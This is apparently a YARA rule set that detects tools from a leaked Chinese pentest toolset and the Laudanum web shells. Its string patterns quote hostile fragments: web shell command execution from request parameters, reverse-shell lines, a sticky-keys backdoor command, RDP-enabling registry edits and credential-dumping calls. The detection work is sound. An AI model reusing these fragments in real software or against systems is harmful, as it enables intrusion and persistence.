      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[SERVER]connection to %s:%d error" fullword ascii
      $s2 = "[+] OK! I Closed The Two Socket." fullword ascii
      $s3 = "[+] Start Transmit (%s:%d <-> %s:%d) ......" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 440KB and all of them
} 

rule CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32_RID3E17 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 22:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "upfile.asp " fullword ascii
      $s2 = "[wscript.shell]" fullword ascii
      $s3 = "XP_CMDSHELL" fullword ascii
      $s4 = "[XP_CMDSHELL]" fullword ascii
      $s5 = "http://d99net.3322.org" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 4 of them
} 

rule CN_Honker_mafix_root_RID2EFF : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file root"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:38:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"# vbox (voice box) getty\" >> /tmp/.init1" fullword ascii
      $s1 = "cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog" fullword ascii
      $s2 = "if [ -f /sbin/xlogin ]; then" fullword ascii
   condition: 
      filesize < 96KB and all of them
} 

rule CN_Honker_passwd_dict_3389_RID3092 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file 3389.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:45:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "654321" fullword ascii
      $s1 = "admin123" fullword ascii
      $s2 = "admin123456" fullword ascii
      $s3 = "administrator" fullword ascii
      $s4 = "passwd" fullword ascii
      $s5 = "password" fullword ascii
      $s7 = "12345678" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Perl_serv_U_RID2F2D : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file Perl-serv-U.pl"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:46:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$dir = 'C:\\\\WINNT\\\\System32\\\\';" fullword ascii
      $s2 = "$sock = IO::Socket::INET->new(\"127.0.0.1:$adminport\") || die \"fail\";" fullword ascii
   condition: 
      filesize < 8KB and all of them
} 

rule CN_Honker_F4ck_Team_f4ck_RID2FBC : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file f4ck.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PassWord:F4ckTeam!@#" fullword ascii
      $s1 = "UserName:F4ck" fullword ascii
      $s2 = "F4ck Team" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_sig_3389_3389_RID2E76 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file 3389.vbs"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:15:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "success = obj.run(\"cmd /c takeown /f %SystemRoot%\\system32\\sethc.exe&echo y| " ascii
   condition: 
      filesize < 10KB and all of them
} 

rule CN_Honker_sig_3389_3389_2_RID2F07 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file 3389.bat"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:39:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "@del c:\\termsrvhack.dll" fullword ascii
      $s2 = "@del c:\\3389.txt" fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Injection_Transit_jmCook_RID3470 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file jmCook.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:30:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".Open \"POST\",PostUrl,False" fullword ascii
      $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii
   condition: 
      filesize < 9KB and all of them
} 

rule CN_Honker_portRecall_pr_RID3020 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file pr"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:26:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: Same as lcx.exe in win32 :)" fullword ascii
      $s2 = "connect to client" fullword ascii
      $s3 = "PR(Packet redirection) for linux " fullword ascii
   condition: 
      filesize < 70KB and all of them
} 

rule CN_Honker_sig_3389_3389_3_RID2F08 : CHINA DEMO SUSP T1050 T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file 3389.bat"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:39:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"fDenyTSConnections\"=dword:00000000>>3389.reg " fullword ascii
      $s2 = "echo \"PortNumber\"=dword:00000d3d>>3389.reg " fullword ascii
      $s3 = "echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]>>" ascii
   condition: 
      filesize < 2KB and all of them
} 

rule CN_Honker_Alien_D_RID2D53 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file D.ASP"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:27:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr" ascii
      $s1 = "CONST_FSO=\"Script\"&\"ing.Fil\"&\"eSyst\"&\"emObject\"" fullword ascii
      $s2 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii
      $s3 = "set getAtt=FSO.GetFile(filepath)" fullword ascii
      $s4 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' chec" ascii
   condition: 
      filesize < 30KB and 2 of them
} 

rule CN_Honker_ChinaChopper_db_RID30A0 : CHINA DEMO SUSP T1100 T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file db.mdb"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:47:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1100, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://www.maicaidao.com/server.phpcaidao" fullword wide
      $s2 = "<O>act=login</O>" fullword wide
      $s3 = "<H>localhost</H>" fullword wide
   condition: 
      filesize < 340KB and 2 of them
} 

rule CN_Honker_syconfig_RID2E29 : CHINA DEMO FILE SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file syconfig.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Hashq.CrackHost+FormUnit" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x0100 and filesize < 18KB and all of them
} 

rule CN_Honker_linux_bin_RID2E8F : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file linux_bin"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:19:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "client.sin_port = htons(atoi(argv[3]));" fullword ascii
      $s2 = "printf(\"\\n\\n*********Waiting Client connect*****\\n\\n\");" fullword ascii
   condition: 
      filesize < 20KB and all of them
} 

rule CN_Honker_Intersect2_Beta_RID3085 : CHINA DEMO FILE SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file Intersect2-Beta.py"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:43:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "os.system(\"ls -alhR /home > AllUsers.txt\")" fullword ascii
      $s2 = "os.system('getent passwd > passwd.txt')" fullword ascii
      $s3 = "os.system(\"rm -rf credentials/\")" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x2123 and filesize < 50KB and 2 of them
} 

rule CN_Honker_IIS_logcleaner1_0_readme_RID33B4 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file readme.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:59:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "LogCleaner.exe <ip> [Logpath]" fullword ascii
      $s3 = "http://l-y.vicp.net" fullword ascii
   condition: 
      filesize < 7KB and all of them
} 

rule CN_Honker_Alien_command_RID2FEE : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file command.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:18:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "for /d %i in (E:\\freehost\\*) do @echo %i" fullword ascii
      $s1 = "/c \"C:\\windows\\temp\\cscript\" C:\\windows\\temp\\iis.vbs" fullword ascii
   condition: 
      filesize < 8KB and all of them
} 

rule CN_Honker_portRecall_bc_RID3003 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file bc.pl"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:21:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "print \"[*] Connected to remote host \\n\"; " fullword ascii
      $s1 = "print \"Usage: $0 [Host] [Port] \\n\\n\";  " fullword ascii
      $s5 = "print \"[*] Resolving HostName\\n\"; " fullword ascii
   condition: 
      filesize < 10KB and all of them
} 

rule CN_Honker_Tuoku_script_MSSQL__RID3221 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file MSSQL_.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:52:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetLoginCookie = Request.Cookies(Cookie_Login)" fullword ascii
      $s2 = "if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii
      $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
   condition: 
      filesize < 100KB and all of them
} 

rule CN_Honker_nc_MOVE_RID2D2E : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file MOVE.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:20:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Destination: http://202.113.20.235/gj/images/2.asp" fullword ascii
      $s1 = "HOST: 202.113.20.235" fullword ascii
      $s2 = "MOVE /gj/images/A.txt HTTP/1.1" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_mssqlpw_scan_RID2FE2 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file mssqlpw scan.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:16:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.Write(\"I Get it ! Password is <font color=red>\" & str & \"</font><BR>" ascii
      $s1 = "response.Write \"Done!<br>Process \" & tTime & \" s\"" fullword ascii
   condition: 
      filesize < 6KB and all of them
} 

rule Webshell_XML_WEB_INF_web_RID2FAD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file web.xml"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 12:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<servlet-name>Command</servlet-name>" fullword ascii
      $s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule Webshell_Laudanum_Tools_Generic_RID3369 : DEMO GEN T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 14:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "***  laudanum@secureideas.net" fullword ascii
      $s2 = "*** Laudanum Project" fullword ascii
   condition: 
      filesize < 60KB and all of them
} 

rule Webshell_asp_file_RID2DE9 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
      $s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
      $s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii
      $s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii
      $s5 = "set folder = fso.GetFolder(path)" fullword ascii
      $s6 = "Set file = fso.GetFile(filepath)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 30KB and 5 of them
} 

rule Webshell_php_killnc_RID2ECA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file killnc.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
      $s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s3 = "<?php echo exec('killall nc');?>" fullword ascii
      $s4 = "<title>Laudanum Kill nc</title>" fullword ascii
      $s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
   condition: 
      filesize < 15KB and 4 of them
} 

rule Webshell_asp_shell_2_RID2EF2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:36:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii
      $s2 = "%ComSpec% /c dir" fullword ascii
      $s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii
      $s4 = "Server.ScriptTimeout = 180" fullword ascii
      $s5 = "cmd = Request.Form(\"cmd\")" fullword ascii
      $s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
      $s7 = "Dim wshell, intReturn, strPResult" fullword ascii
   condition: 
      filesize < 15KB and 4 of them
} 

rule Webshell_settings_PHP_RID2F5E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file settings.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii
      $s2 = "<li>Reverse Shell - " fullword ascii
      $s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii
   condition: 
      filesize < 13KB and all of them
} 

rule Webshell_asp_proxy_RID2E8B : DEMO T1090 T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file proxy.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1090, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii
      $s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii
      $s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
      $s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii
      $s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii
      $s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
   condition: 
      filesize < 50KB and all of them
} 

rule Webshell_cfm_shell_RID2E53 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.cfm"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii
      $s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii
      $s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
   condition: 
      filesize < 20KB and 2 of them
} 

rule Webshell_aspx_shell_RID2ED9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.aspx"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii
      $s2 = "remoteIp = Request.UserHostAddress;" fullword ascii
      $s3 = "<form method=\"post\" name=\"shell\">" fullword ascii
      $s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii
   condition: 
      filesize < 20KB and all of them
} 

rule Webshell_php_shell_RID2E65 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii
      $s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii
      $s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii
      $s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii
   condition: 
      filesize < 40KB and all of them
} 

rule Webshell_php_reverse_shell_RID31C0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 13:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii
   condition: 
      filesize < 15KB and all of them
} 

rule Webshell_php_dns_RID2D92 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file dns.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii
      $s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii
      $s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
      $s4 = "foreach (array_keys($types) as $t) {" fullword ascii
   condition: 
      filesize < 15KB and all of them
} 

rule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.war"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cmd.jsp}" fullword ascii
      $s1 = "cmd.jspPK" fullword ascii
      $s2 = "WEB-INF/web.xml" fullword ascii
      $s3 = "WEB-INF/web.xmlPK" fullword ascii
      $s4 = "META-INF/MANIFEST.MF" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them
} 

rule Webshell_laudanum_RID2DFD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file laudanum.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:55:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "public function __activate()" fullword ascii
      $s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii
   condition: 
      filesize < 5KB and all of them
} 

rule Webshell_php_file_RID2DED : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$allowedIPs =" fullword ascii
      $s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii
      $s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
      $s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
   condition: 
      filesize < 10KB and all of them
} 

rule Webshell_warfiles_cmd_RID2F96 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.jsp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 12:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
      $s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
      $s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s4 = "String disr = dis.readLine();" fullword ascii
   condition: 
      filesize < 2KB and all of them
} 

rule Webshell_asp_dns_RID2D8E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file dns.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii
      $s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii
      $s3 = "Response.Write command & \"<br>\"" fullword ascii
      $s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii
   condition: 
      filesize < 21KB and all of them
} 

rule php_reverse_shell_2_RID2EBC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:27:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii
   condition: 
      filesize < 10KB and all of them
} 

